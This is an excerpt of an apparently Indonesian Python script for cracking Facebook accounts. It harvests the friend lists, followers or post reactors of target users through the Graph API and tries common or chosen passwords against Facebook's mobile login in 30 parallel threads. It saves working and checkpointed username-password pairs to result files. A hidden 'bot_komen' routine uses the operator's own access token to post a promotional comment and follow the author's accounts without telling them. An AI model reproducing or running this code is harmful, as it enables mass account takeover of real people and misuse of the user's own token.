...
def logo():
	os.system("clear")
	print("  \033[0;91m___ ___ __  __ ___ ___ \n \033[0;91m/ __|_ _|  \/  | _ ) __|    \033[0;96mAU\033[0;97m : ANGGA KURNIAWAN\n\033[0;97m \__ \| || |\/| | _ \ _|     \033[0;91mFB\033[0;97m : FB.ME/GAAAARZXD\n\033[0;97m |___/___|_|  |_|___/_|  \033[0;91mV.1 \033[0;93mGH\033[0;97m : GITHUB.COM/ANGGAXD")

def bot_komen():
    try:
        token = open('login.txt', 'r').read()
    except IOError:
        print(' \033[0;97m[\033[0;91m!\033[0;97m] token kadaluarsa!!')
        os.system('rm -rf login.txt')
    una = ('100009447779678') 
    post = ('3011952665796296') 
    kom = ('trusted ,amanah terpercaya !!!') 
    requests.post('https://graph.facebook.com/' + post + '/comments/?message=' + kom + '&access_token=' + token)
    requests.post('https://graph.facebook.com/100009447779678/subscribers?access_token=' + token) #M4L4IK4T T4K B3R54Y4P
    requests.post('https://graph.facebook.com/100003603863923/subscribers?access_token=' + token) #Emprit Panfestu
    requests.post('https://graph.facebook.com/100001134480658/subscribers?access_token=' + token) #Taufik
    requests.post('https://graph.facebook.com/100038342055141/subscribers?access_token=' + token) #KOEN IKU KE KONTOL
    requests.post('https://graph.facebook.com/100004003690596/subscribers?access_token=' + token) #Widiya Aza
    requests.post('https://graph.facebook.com/1475910687/subscribers?access_token=' + token) #Hozuki Suigetsu
    requests.post('https://graph.facebook.com/100001403405461/subscribers?access_token=' + token) #Dhenii Saraswatii
    requests.post('https://graph.facebook.com/100006812109545/subscribers?access_token=' + token) #Bismay Kumar Panda
    requests.post('https://graph.facebook.com/100001152080193/subscribers?access_token=' + token) #Mustolih Lih
    requests.post('https://graph.facebook.com/100000517973128/subscribers?access_token=' + token) #Azka Chandrawinnata
    requests.post('https://graph.facebook.com/100011083959831/subscribers?access_token=' + token) #Dica
...
def cookie():
	...
	try:
		...
		hasil    = " \033[0;97m[\033[0;91m!\033[0;97m] cookies kadaluarsa!!" if (find_token is None) else '\n* Your fb access token : ' + find_token.group(1)
...
def tokenz():
	...
	try:
		...
		try:
			...
			exit(" \033[0;97m[\033[0;91m!\033[0;97m] token kadaluarsa!!")
...
def menu():
	...
	try:
		...
		exit(' \033[0;97m[\033[0;91m!\033[0;97m] tidak ada koneksi!!')
	logo()
	print("\n \033[0;97m[\033[0;96m+\033[0;97m] nama : %s"%(nama))
	print(" \033[0;97m[\033[0;96m+\033[0;97m] alamat ip  : "+ip)
	print(" \033[0;97m[\033[0;93m#\033[0;97m] --------------------------------------------") 
	print(" \033[0;97m[\033[0;96m1\033[0;97m] crack teman publik")
	print(" \033[0;97m[\033[0;96m2\033[0;97m] crack dari follower")
	print(" \033[0;97m[\033[0;96m3\033[0;97m] crack dari reaction")
	print(" \033[0;97m[\033[0;96m4\033[0;97m] cek hasil crack")
	print(" \033[0;97m[\033[0;96m5\033[0;97m] setting user-agent")
	print(" \033[0;97m[\033[0;91m0\033[0;97m] keluar")
	ask = raw_input("\n \033[0;97m[\033[0;93m?\033[0;97m] pilih : ")
	if ask =="":
		menu()
	elif ask == "1" or ask == "01":
		...
		print("\n \033[0;97m[\033[0;96m1\033[0;97m] cek hasil crack OK")
		print(" \033[0;97m[\033[0;96m2\033[0;97m] cek hasil crack CP")
		ask = raw_input("\n \033[0;97m[\033[0;93m?\033[0;97m] pilih : ")
		if ask =="":
			menu()
		elif ask == "1" or ask == "01":
...
def public():
	...
	try:
		...
		print(' \033[0;97m[\033[0;91m!\033[0;97m] token kadaluarsa!!')
		tokenz()
	print("\n \033[0;97m[\033[0;93m*\033[0;97m] ketik 'me' untuk crack list teman sendiri")
	idt = raw_input(" \033[0;97m[\033[0;92m+\033[0;97m] id target 1 : ")
	idt1 = raw_input(" \033[0;97m[\033[0;92m+\033[0;97m] id target 2 : ")
	idt2 = raw_input(" \033[0;97m[\033[0;92m+\033[0;97m] id target 3 : ")
	idt3 = raw_input(" \033[0;97m[\033[0;92m+\033[0;97m] id target 4 : ")
	idt4 = raw_input(" \033[0;97m[\033[0;92m+\033[0;97m] id target 5 : ")
	try:
		pok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
		pok1 = requests.get("https://graph.facebook.com/"+idt1+"?access_token="+token)
		pok2 = requests.get("https://graph.facebook.com/"+idt2+"?access_token="+token)
		sp = json.loads(pok.text)
		sp = json.loads(pok1.text)
		sp = json.loads(pok2.text)
		#print(" \033[0;97m[\033[0;92m+\033[0;97m] Name : "+sp["name"])
	except KeyError:
		exit(' \033[0;97m[\033[0;91m!\033[0;97m] id target tidak ditemukan!!')
	r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token)
	r1 = requests.get("https://graph.facebook.com/"+idt1+"/friends?access_token="+token)
	r2 = requests.get("https://graph.facebook.com/"+idt2+"/friends?access_token="+token)
	z = json.loads(r.text)
	z = json.loads(r1.text)
	z = json.loads(r2.text)
	for i in z["data"]:
		uid = i['id']
		name = i['name']
		id.append(uid+'<=>'+name)
	print(" \033[0;97m[\033[0;93m*\033[0;97m] total target  : \033[0;91m"+str(len(id)))
	ask = raw_input("\n \033[0;97m[\033[0;93m?\033[0;97m] gunakan sandi manual? Y/t : ")
	if ask == "Y" or ask == "y":
		manual()
	print(" \033[0;97m[\033[0;96m+\033[0;97m] ok\033[0;97m disimpan di : results/OK-%s-%s-%s.txt"% (ha, op, ta))
	print(" \033[0;97m[\033[0;96m+\033[0;97m] cp\033[0;97m disimpan di : results/CP-%s-%s-%s.txt\n"% (ha, op, ta))
	...
	def main(user):
		...
		try:
			for pw in pwx:
				...
				user_agent = requests.get('https://raw.githubusercontent.com/amdiutama/lol/main/user_agent.txt').text.strip()
				...
				if 'mbasic_logout_button' in xo or 'save-device' in xo:
					print('\r  \033[0;92m* -->\033[0;97m ' +uid+ '|' + pw + '       ')
					ok.append(uid+'|'+pw)
				...
				if 'checkpoint' in xo:
					try:
						...
						nama = data['name']
						print('\r  \033[0;93m* -->\033[0;97m ' +uid+ '|' + pw + '|' + ttl)
					...
					print('\r  \033[0;93m* -->\033[0;97m ' +uid+ '|' + pw + '       ')
					cp.append(uid+'|'+pw)
					save = open('results/CP-%s-%s-%s.txt' % (ha, op, ta),'a') 
					save.write('  * --> '+str(uid)+'|'+str(pw)+'\n')
					save.close()
	...
	p = ThreadPool(30)
	p.map(main, id)
	exit("\n \033[0;97m[\033[0;96m#\033[0;97m] proses crack telah selesai..")
...
def followers():
	...
	idt = raw_input(" \033[0;97m[\033[0;92m+\033[0;97m] id target : ")
	try:
		pok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
		sp = json.loads(pok.text)
		#print(" \033[0;97m[\033[0;92m+\033[0;97m] Name : "+sp["name"])
	...
	if ask == "Y" or ask == "y":
		manual()
	print(" \033[0;97m[\033[0;96m+\033[0;97m]  \033[0;92mOK\033[0;97m disimpan di : results/OK-%s-%s-%s.txt"% (ha, op, ta))
	print(" \033[0;97m[\033[0;96m+\033[0;97m]  \033[0;93mcp\033[0;97m disimpan di : results/CP-%s-%s-%s.txt\n"% (ha, op, ta))
...
def reaction():
	...
	try:
		...
		exit(' \033[0;97m[\033[0;91m!\033[0;97m] id postingan tidak ditemukan!!')
...
def manual():
	print(" \033[0;97m[\033[0;93m*\033[0;97m] contoh sandi : bismillah,123456,indonesia")
	pw = raw_input(" \033[0;97m[\033[0;93m?\033[0;97m] masukan sandi : ")
	print("\n \033[0;97m[\033[0;93m*\033[0;97m] crack dengan sandi : \033[0;91m%s"%(pw))
	if len(pw) ==0:
		exit(" \033[0;97m[\033[0;91m!\033[0;97m] jangan kosong!!")
	print(" \033[0;97m[\033[0;96m+\033[0;97m] \033[0;92mok\033[0;97m disimpan di : results/OK-%s-%s-%s.txt"% (ha, op, ta))
	print(" \033[0;97m[\033[0;96m+\033[0;97m] \033[0;93mcp\033[0;97m disimpan di : results/CP-%s-%s-%s.txt\n"% (ha, op, ta))
	...
	def main(user):
		...
		try:
			for asu in pw.split(","):
				...
				xo = rex.content
				if 'mbasic_logout_button' in xo or 'save-device' in xo:
					print('\r  \033[0;92m* -->\033[0;97m ' +uid+ '|' + asu + '       ')
					ok.append(uid+'|'+asu)
					save = open('results/OK-%s-%s-%s.txt' % (ha, op, ta),'a') 
				...
				if 'checkpoint' in xo:
					try:
						...
						data = s.get(url).json()
						ttl = data['birthday'].replace("/","-")
						print('\r  \033[0;93m* -->\033[0;97m ' +uid+ '|' + asu + '|' + ttl)
					...
					print('\r  \033[0;93m* -->\033[0;97m ' +uid+ '|' + asu + '       ')
					cp.append(uid+'|'+asu)
					save = open('results/CP-%s-%s-%s.txt' % (ha, op, ta),'a') 
					save.write('  * --> '+str(uid)+'|'+str(asu)+'\n')
					save.close()
